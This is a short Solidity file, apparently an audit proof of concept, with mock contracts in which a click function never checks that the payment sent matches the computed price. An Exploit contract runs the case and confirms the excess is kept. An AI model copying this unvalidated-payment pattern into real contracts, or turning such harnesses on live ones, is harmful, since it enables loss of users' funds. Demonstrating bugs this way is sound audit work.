// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract Plugin { uint256 public entryFee=1; function getPrice() external view returns(uint256){return entryFee;} }
contract Multicall { Plugin public plugin; uint256 public retained; constructor(){plugin=new Plugin();} function click(uint256 amount,uint256 supplied) external { uint256 price=plugin.getPrice()*amount;
        // @> no validation that msg.value == price
        retained=supplied-price; } }
contract Exploit { uint256 public excess; bool public harmed; event Proof(uint256 excess);
    function run() external { Multicall m=new Multicall(); m.click(1,100); excess=m.retained(); harmed=excess==99; emit Proof(excess); require(harmed,"excess refunded"); }
}
